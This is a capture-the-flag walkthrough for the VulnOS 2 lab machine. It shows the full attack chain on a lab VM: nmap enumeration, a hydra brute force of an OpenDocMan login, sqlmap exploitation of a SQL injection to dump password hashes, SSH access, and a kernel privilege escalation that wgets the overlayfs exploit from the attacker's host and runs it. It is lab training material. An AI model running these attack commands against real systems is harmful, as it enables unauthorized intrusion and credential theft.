# VulnOS: 2

## 1.Get VM IP

```text
root@kali: arp-scan -I eth0 -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:0f       (Unknown: locally administered)
192.168.56.100  08:00:27:d6:4d:fa       PCS Systemtechnik GmbH
192.168.56.104  08:00:27:57:4f:aa       PCS Systemtechnik GmbH
```

The IP address is `192.168.56.104`, lets enumerate it.

## 2.Enumeration

```text
root@kali: nmap -sV -sC -p- -v -oN fullscan 192.168.56.104

Nmap scan report for 192.168.56.104
Host is up (0.00011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: VulnOSv2
|_http-server-header: Apache/2.4.7 (Ubuntu)
6667/tcp open  irc     ngircd
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Checking port 80 shows a basic website :

![mainPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/378a7c15-24ab-4726-9a9e-d20150ac6047)

i first navigated each menu and its page source, `documentation` menu is weird and has nothing in UI but if you see the page source

or highlight the page, it mentions a directory (/jabcd0cs/) ;

![path](https://github.com/Git-K3rnel/VulnHub/assets/127470407/eb055fed-4dab-4632-b8c8-c9cdd5758e61)

is also started fuzzing the website and checking robots.txt which revealed new directories :

```text
User-agent: *
Crawl-delay: 10
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

there is nothing interesting in these directories, so let's check the `/jabcd0cs/` :

![docman](https://github.com/Git-K3rnel/VulnHub/assets/127470407/47cbb7ec-3500-4723-878d-6fa4fb98b793)

here i just brute force the page with some default credentials :

```text
root@kali: hydra -L /default-usernames.txt  -P /default-usernames.txt 192.168.56.104 http-post-form "/jabcd0cs/:frmuser=^USER^&frmpass=^PASS^&login=Enter:Error" -v

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-26 04:47:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 576 login tries (l:24/p:24), ~36 tries per task
[DATA] attacking http-post-form://192.168.56.104:80/jabcd0cs/:frmuser=^USER^&frmpass=^PASS^&login=Enter:Error
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http[s]://192.168.56.104:80/jabcd0cs/out.php
[80][http-post-form] host: 192.168.56.104   login: guest   password: guest
[STATUS] attack finished for 192.168.56.104 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

yes, i found `guest:guest` here, tried several ways to get a web shell but didn't work.

so i checked `searchsploit` for any known exploit for `opendocman` :

```text
root@kali: searchsploit opendocman

OpenDocMan 1.2.7 - Multiple Vulnerabilities  | php/webapps/32075.txt
```

reading through [this](https://www.exploit-db.com/exploits/32075) document, it says there is a SQLi here :

```text
The exploitation example below displays version of the MySQL server:

http://[host]/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,v
ersion%28%29,3,4,5,6,7,8,9
```

all we need to do is to replace the values according to our target and use sqlmap to attack the database :

```text
root@kali: sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php/?q=1&add_value=odm_user" -p add_value --batch --level 3 --dbs

available databases [6]:
[*] drupal7
[*] information_schema
[*] jabcd0cs
[*] mysql
[*] performance_schema
[*] phpmyadmin
```

we are interested in `jabcd0cs` database so let's see the tables :

```text
root@kali: sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php/?q=1&add_value=odm_user" -p add_value --batch --level 3 -D jabcd0cs --tables

[15 tables]
+-------------------+
| odm_access_log    |
| odm_admin         |
| odm_category      |
| odm_data          |
| odm_department    |
| odm_dept_perms    |
| odm_dept_reviewer |
| odm_filetypes     |
| odm_log           |
| odm_odmsys        |
| odm_rights        |
| odm_settings      |
| odm_udf           |
| odm_user          |
| odm_user_perms    |
+-------------------+
```

what is better than `odm_user` table ? let's see the columns :

```text
root@kali: sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php/?q=1&add_value=odm_user" -p add_value --batch --level 3 -D jabcd0cs -T odm_user --columns

[9 columns]
+---------------+------------------+
| Column        | Type             |
+---------------+------------------+
| department    | int(11) unsigned |
| Email         | varchar(50)      |
| first_name    | varchar(255)     |
| id            | int(11) unsigned |
| last_name     | varchar(255)     |
| password      | varchar(50)      |
| phone         | varchar(20)      |
| pw_reset_code | char(32)         |
| username      | varchar(25)      |
+---------------+------------------+
```

i need all of them, so let's dump all the info :

```text
root@kali: sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php/?q=1&add_value=odm_user" -p add_value --batch --level 3 -D jabcd0cs -T odm_user --dump

+----+--------------------+-------------+----------------------------------+----------+-----------+------------+------------+---------------+
| id | Email              | phone       | password                         | username | last_name | department | first_name | pw_reset_code |
+----+--------------------+-------------+----------------------------------+----------+-----------+------------+------------+---------------+
| 1  | webmin@example.com | 5555551212  | b78aae356709f8c31118ea613980954b | webmin   | min       | 2          | web        | <blank>       |
| 2  | guest@example.com  | 555 5555555 | 084e0343a0486ff05530df6c705c8bb4 | guest    | guest     | 2          | guest      | NULL          |
+----+--------------------+-------------+----------------------------------+----------+-----------+------------+------------+---------------+
```

## 3.Gainig Shell

Perfect, we now have the hashes, i just go for `webmin` user to crack the hash using an online tool

and i got the cracked hash as `webmin1980` and immediately checked SSH to connect:

```text
root@kali: ssh webmin@192.168.56.104

The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
ED25519 key fingerprint is SHA256:7FO0Y5C+W/hj0ShAjGy33uQvuMRPrSNk82jGy/wxnfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.104' (ED25519) to the list of known hosts.
webmin@192.168.56.104's password:
Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Sep 26 08:35:28 CEST 2023

  System load: 0.08              Memory usage: 2%   Processes:       62
  Usage of /:  5.9% of 29.91GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Mon Sep 25 12:04:19 2023 from 192.168.56.101
$ id
uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
```

## 4.Privilege Escalation

Just check the kernel version and you find an exploit for it :

```text
$ uname -a
Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux

$ cat /etc/os-release
NAME="Ubuntu"
VERSION="14.04.4 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.4 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

using searchsploit we find the correct exploit :

```text
root@kali: searchsploit kernel 3.13
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation  | linux/local/37292.c
```

upload it on victim and compile it :

```text
$ wget http://192.168.56.102/37292.c
--2023-09-26 13:10:36--  http://192.168.56.102/37292.c
Connecting to 192.168.56.102:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: ‘37292.c’

100%[========================================================>] 4,968       --.-K/s   in 0s

2023-09-26 13:10:36 (92.3 MB/s) - ‘37292.c’ saved [4968/4968]

$ gcc 37292.c
$ ls
37292.c  a.out

$ ./a.out
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

# id
uid=0(root) gid=0(root) groups=0(root),1001(webmin)

# cd /root

# cat flag.txt
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
```

This is how you can root this machine :)












